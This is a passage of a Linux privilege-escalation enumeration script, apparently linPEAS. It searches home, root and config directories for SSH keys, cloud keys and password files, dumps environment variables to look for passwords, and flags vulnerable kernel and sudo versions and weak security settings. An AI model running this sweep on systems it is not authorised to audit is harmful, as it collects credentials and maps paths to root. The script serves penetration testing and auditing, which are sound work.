  FIND_PHP_RELEVANT_NAMES=$(prep_to_find "$PHP_RELEVANT_NAMES")
  FIND_WORDPRESS_RELEVANT_NAMES=$(prep_to_find "$WORDPRESS_RELEVANT_NAMES")
  FIND_DRUPAL_RELEVANT_NAMES=$(prep_to_find "$DRUPAL_RELEVANT_NAMES")
  FIND_TOMCAT_RELEVANT_NAMES=$(prep_to_find "$TOMCAT_RELEVANT_NAMES")
  FIND_MONGO_RELEVANT_NAMES=$(prep_to_find "$MONGO_RELEVANT_NAMES")
  FIND_SUPERVISORD_RELEVANT_NAMES=$(prep_to_find "$SUPERVISORD_RELEVANT_NAMES")
  FIND_CESI_RELEVANT_NAMES=$(prep_to_find "$CESI_RELEVANT_NAMES")
  FIND_RSYNCD_RELEVANT_NAMES=$(prep_to_find "$RSYNCD_RELEVANT_NAMES")
  FIND_HOSTAPAD_RELEVANT_NAMES=$(prep_to_find "$HOSTAPAD_RELEVANT_NAMES")
  FIND_ANACONDA_KS_RELEVANT_NAMES=$(prep_to_find "$ANACONDA_KS_RELEVANT_NAMES")
  FIND_VNC_RELEVANT_NAMES=$(prep_to_find "$VNC_RELEVANT_NAMES")
  FIND_LDAP_RELEVANT_NAMES=$(prep_to_find "$LDAP_RELEVANT_NAMES")
  FIND_OVPN_RELEVANT_NAMES=$(prep_to_find "$OVPN_RELEVANT_NAMES")
  FIND_SSH_RELEVANT_NAMES=$(prep_to_find "$SSH_RELEVANT_NAMES")
  FIND_CLOUD_KEYS_RELEVANT_NAMES=$(prep_to_find "$CLOUD_KEYS_RELEVANT_NAMES")
  FIND_KERBEROS_RELEVANT_NAMES=$(prep_to_find "$KERBEROS_RELEVANT_NAMES")
  FIND_KIBANA_RELEVANT_NAMES=$(prep_to_find "$KIBANA_RELEVANT_NAMES")
  FIND_KNOCK_RELEVANT_NAMES=$(prep_to_find "$sK_RELEVANT_NAMES")
  FIND_LOGSTASH_RELEVANT_NAMES=$(prep_to_find "$LOGSTASH_RELEVANT_NAMES")
  FIND_ELASTICSEARCH_RELEVANT_NAMES=$(prep_to_find "$ELASTICSEARCH_RELEVANT_NAMES")
  FIND_COUCHDB_RELEVANT_NAMES=$(prep_to_find "$COUCHDB_RELEVANT_NAMES")
  FIND_REDIS_RELEVANT_NAMES=$(prep_to_find "$REDIS_RELEVANT_NAMES")
  FIND_MOSQUITTO_RELEVANT_NAMES=$(prep_to_find "$MOSQUITTO_RELEVANT_NAMES")
  FIND_NEO4J_RELEVANT_NAMES=$(prep_to_find "$NEO4J_RELEVANT_NAMES")
  FIND_ERLANG_RELEVANT_NAMES=$(prep_to_find "$ERLANG_RELEVANT_NAMES")
  FIND_GVM_RELEVANT_NAMES=$(prep_to_find "$GVM_RELEVANT_NAMES")
  FIND_IPSEC_RELEVANT_NAMES=$(prep_to_find "$IPSEC_RELEVANT_NAMES")

  FIND_DB_RELEVANT_NAMES=$(prep_to_find "$DB_RELEVANT_NAMES")
  FIND_INSTERESTING_RELEVANT_NAMES=$(prep_to_find "$INSTERESTING_RELEVANT_NAMES")
  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")


  # Directories
  FIND_DIR_VAR=$(eval find /var -type d $FIND_MYSQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_DIR_VAR" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_DIR_ETC=$(eval find /etc -type d $FIND_MYSQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_DBUS_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_DIR_ETC" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_DIR_HOME=$(eval find /home -type d $FIND_APACHE_RELEVANT_NAMES -o $FIND_VNC_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_DIR_HOME" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_DIR_ROOT=$(eval find /root -type d $FIND_APACHE_RELEVANT_NAMES -o $FIND_VNC_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_DIR_ROOT" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_DIR_TMP=$(eval find /tmp -type d $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_DIR_TMP" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_DIR_USR=$(eval find /usr -type d $FIND_MYSQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_DIR_USR" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_DIR_OPT=$(eval find /opt -type d $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_DIR_OPT" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi

  # All
  FIND_HOME=$(eval find /home/ $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_PASSWORD_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_HOME" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_ETC=$(eval find /etc/ $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_KNOCK_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_ETC" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_ROOT=$(eval find /root/ $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_PASSWORD_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_ROOT" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_VAR=$(eval find /var/ $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_VAR" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_TMP=$(eval find /tmp/ $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_TMP" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_OPT=$(eval find /opt/ $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_OPT" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_USR=$(eval find /usr/ $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES  2>/dev/null | sort)
  if [ "$FIND_USR" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_MNT=$(eval find /mnt/ $FIND_SSH_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_MNT" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_LIB=$(eval find /lib/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_LIB" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_RUN=$(eval find /run/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_RUN" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_SYSTEMD=$(eval find /systemd/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_SYSTEMD" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_SYS=$(eval find /sys/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_SYS" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi
  FIND_SNAP=$(eval find /snap/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort)
  if [ "$FIND_VAR" ]; then printf $RED". "$NC; else printf $GREEN". "$NC; fi

  printf $Y"DONE\n"$NC
fi


if [ "`echo $CHECKS | grep SysI`" ]; then
  ###########################################
  #-------------) System Info (-------------#
  ###########################################
  printf $B"====================================( "$GREEN"System Information"$B" )====================================\n"$NC

  #-- 1SY) OS
  printf $Y"[+] "$GREEN"Operative system\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits\n"$NC
  (cat /proc/version || uname -a ) 2>/dev/null | sed "s,$kernelDCW_Ubuntu_Precise_1,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Ubuntu_Precise_2,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Ubuntu_Trusty_1,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Ubuntu_Trusty_2,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Ubuntu_Xenial,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Rhel5,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Rhel6_1,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Rhel6_2,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Rhel7,${C}[1;31;103m&${C}[0m," | sed "s,$kernelB,${C}[1;31m&${C}[0m,"
  lsb_release -a 2>/dev/null
  echo ""

  #-- 2SY) Sudo 
  printf $Y"[+] "$GREEN"Sudo version\n"$NC
  if [ "`which sudo 2>/dev/null`" ]; then
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version\n"$NC
    sudo -V 2>/dev/null | grep "Sudo ver" | sed "s,$sudovB,${C}[1;31m&${C}[0m,"
  else echo_not_found "sudo"
  fi
  echo ""

  #-- 3SY) PATH
  printf $Y"[+] "$GREEN"PATH\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath\n"$NC
  echo $OLDPATH 2>/dev/null | sed "s,$Wfolders\|\./\|\.:\|:\.,${C}[1;31;103m&${C}[0m,g"
  echo "New path exported: $PATH" 2>/dev/null | sed "s,$Wfolders\|\./\|\.:\|:\. ,${C}[1;31;103m&${C}[0m,g" 
  echo ""

  #-- 4SY) Date
  printf $Y"[+] "$GREEN"Date\n"$NC
  date 2>/dev/null || echo_not_found "date"
  echo ""

  #-- 5SY) System stats
  printf $Y"[+] "$GREEN"System stats\n"$NC
  (df -h || lsblk) 2>/dev/null || echo_not_found "df and lsblk"
  free 2>/dev/null || echo_not_found "free"
  echo ""

  #-- 6SY) Environment vars 
  printf $Y"[+] "$GREEN"Environment\n"$NC
  printf $B"[i] "$Y"Any private information inside environment variables?\n"$NC
  (env || set) 2>/dev/null | grep -v "RELEVANT*\|FIND*\|^VERSION=\|ldsoconfdG\|pwd_inside_history\|kernelDCW_Ubuntu_Precise_1\|kernelDCW_Ubuntu_Precise_2\|kernelDCW_Ubuntu_Trusty_1\|kernelDCW_Ubuntu_Trusty_2\|kernelDCW_Ubuntu_Xenial\|kernelDCW_Rhel5\|kernelDCW_Rhel6_1\|kernelDCW_Rhel6_2\|kernelDCW_Rhel7\|^sudovB=\|^rootcommon=\|^mounted=\|^mountG=\|^notmounted=\|^mountpermsB=\|^mountpermsG=\|^kernelB=\|^C=\|^RED=\|^GREEN=\|^Y=\|^B=\|^NC=\|TIMEOUT=\|groupsB=\|groupsVB=\|knw_grps=\|sidG=\|sidB=\|sidVB=\|sudoB=\|sudoVB=\|sudocapsB=\|timersG=\|capsB=\|\notExtensions=\|Wfolders=\|writeB=\|writeVB=\|_usrs=\|compiler=\|PWD=\|LS_COLORS=\|pathshG=\|notBackup=" | sed "s,pwd\|passw\|PWD\|PASSW\|Passwd\|Pwd,${C}[1;31m&${C}[0m,g" || echo_not_found "env || set"
  echo ""

  #-- 7SY) Dmesg
  printf $Y"[+] "$GREEN"Searching Signature verification failed in dmseg\n"$NC
  (dmesg 2>/dev/null | grep signature) || echo_not_found
  echo ""

  #-- SY) AppArmor
  printf $Y"[+] "$GREEN"AppArmor enabled? .............. "$NC
  if [ `which aa-status 2>/dev/null` ]; then
    aa-status | sed "s,disabled,${C}[1;31m&${C}[0m,"
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status | sed "s,disabled,${C}[1;31m&${C}[0m,"
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo_not_found "AppArmor"
  fi

  #-- SY) grsecurity
  printf $Y"[+] "$GREEN"grsecurity present? ............ "$NC
  ((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo_not_found "grsecurity")

  #-- SY) Execshield
  printf $Y"[+] "$GREEN"PaX bins present? .............. "$NC
  (which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo_not_found "PaX")

  #-- SY) PaX
  printf $Y"[+] "$GREEN"Execshield enabled? ............ "$NC
  (grep "exec-shield" /etc/sysctl.conf || echo_not_found "Execshield") | sed "s,=0,${C}[1;31m&${C}[0m,"

  #-- 8SY) SElinux
  printf $Y"[+] "$GREEN"SELinux enabled? ............... "$NC
  (sestatus 2>/dev/null || echo_not_found "sestatus") | sed "s,disabled,${C}[1;31m&${C}[0m,"

  #-- 11SY) ASLR
  printf $Y"[+] "$GREEN"Is ASLR enabled? ............... "$NC
  ASLR=`cat /proc/sys/kernel/randomize_va_space 2>/dev/null`
  if [ -z "$ASLR" ]; then 
    echo_not_found "/proc/sys/kernel/randomize_va_space"; 
  else
    if [ "$ASLR" -eq "0" ]; then printf $RED"No"$NC; else printf $GREEN"Yes"$NC; fi
    echo ""
  fi

  #-- 9SY) Printer
  printf $Y"[+] "$GREEN"Printer? ....................... "$NC
  lpstat -a 2>/dev/null || echo_not_found "lpstat"

  #-- 10SY) Container
  printf $Y"[+] "$GREEN"Is this a container? ........... "$NC
  dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -maxdepth 3 -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
  lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
  if [ "$dockercontainer" ]; then echo "Looks like we're in a Docker container" | sed "s,.*,${C}[1;31m&${C}[0m,";
  elif [ "$lxccontainer" ]; then echo "Looks like we're in a LXC container" | sed "s,.*,${C}[1;31m&${C}[0m,";
  else echo_no
  fi

  #-- ????) Containers Running
  printf $Y"[+] "$GREEN"Any running containers? ........ "$NC
  # Get counts of running containers for each platform
  dockercontainers=`docker ps --format "{{.Names}}" 2>/dev/null | wc -l`
  lxccontainers=`lxc list -c n --format csv 2>/dev/null | wc -l`
  rktcontainers=`rkt list 2>/dev/null | tail -n +2  | wc -l`
  if [ "$dockercontainers" -eq "0" ] && [ "$lxccontainers" -eq "0" ] && [ "$rktcontainers" -eq "0" ]; then
    echo_no
  else
    containerCounts=""
    if [ "$dockercontainers" -ne "0" ]; then containerCounts="${containerCounts}docker($dockercontainers) "; fi
    if [ "$lxccontainers" -ne "0" ]; then containerCounts="${containerCounts}lxc($lxccontainers) "; fi
    if [ "$rktcontainers" -ne "0" ]; then containerCounts="${containerCounts}rkt($rktcontainers) "; fi
    echo "Yes $containerCounts" | sed "s,.*,${C}[1;31m&${C}[0m,"
    # List any running containers
    if [ "$dockercontainers" -ne "0" ]; then echo "Running Docker Containers" | sed "s,.*,${C}[1;31m&${C}[0m,"; docker ps | tail -n +2 2>/dev/null; echo ""; fi
    if [ "$lxccontainers" -ne "0" ]; then echo "Running LXC Containers" | sed "s,.*,${C}[1;31m&${C}[0m,"; lxc list 2>/dev/null; echo ""; fi
    if [ "$rktcontainers" -ne "0" ]; then echo "Running RKT Containers" | sed "s,.*,${C}[1;31m&${C}[0m,"; rkt list 2>/dev/null; echo ""; fi
  fi

  echo ""
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep Devs`" ]; then
  ###########################################
  #---------------) Devices (---------------#
  ###########################################
  printf $B"=========================================( "$GREEN"Devices"$B" )==========================================\n"$NC

  #-- 1D) sd in /dev
  printf $Y"[+] "$GREEN"Any sd* disk in /dev? (limit 20)\n"$NC
  ls /dev 2>/dev/null | grep -i "sd" | sed "s,crypt,${C}[1;31m&${C}[0m," | head -n 20
  echo ""

  #-- 2D) Unmounted
  printf $Y"[+] "$GREEN"Unmounted file-system?\n"$NC
  printf $B"[i] "$Y"Check if you can mount umounted devices\n"$NC
  cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | sed "s,$mountG,${C}[1;32m&${C}[0m,g" | sed "s,$notmounted,${C}[1;31m&${C}[0m," | sed "s,$mounted,${C}[1;34m&${C}[0m," | sed "s,$Wfolders,${C}[1;31m&${C}[0m," | sed "s,$mountpermsB,${C}[1;31m&${C}[0m,g" | sed "s,$mountpermsG,${C}[1;32m&${C}[0m,g"
  echo ""
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep AvaSof`" ]; then
  ###########################################
  #---------) Available Software (----------#
  ###########################################
  printf $B"====================================( "$GREEN"Available Software"$B" )====================================\n"$NC

  #-- 1AS) Useful software
  printf $Y"[+] "$GREEN"Useful software\n"$NC
  which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null
  echo ""

  #-- 2AS) Search for compilers
  printf $Y"[+] "$GREEN"Installed Compiler\n"$NC
  (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/"); 
  echo ""
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep ProCronSrvcsTmrsSocks`" ]; then
  ####################################################
  #-----) Processes & Cron & Services & Timers (-----#
  ####################################################
  printf $B"================================( "$GREEN"Processes, Cron, Services, Timers & Sockets"$B" )================================\n"$NC

  #-- 1PCS) Cleaned proccesses
  printf $Y"[+] "$GREEN"Cleaned processes\n"$NC
  if [ "$NOUSEPS" ]; then
    printf $B"[i] "$GREEN"Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes\n"$NC
  fi
  printf $B"[i] "$Y"Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes\n"$NC

  if [ "$NOUSEPS" ]; then
    print_ps | sed "s,$Wfolders,${C}[1;31m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$rootcommon,${C}[1;32m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m," | sed "s,$processesVB,${C}[1;31;103m&${C}[0m,g" | sed "s,$processesB,${C}[1;31m&${C}[0m," 
  else
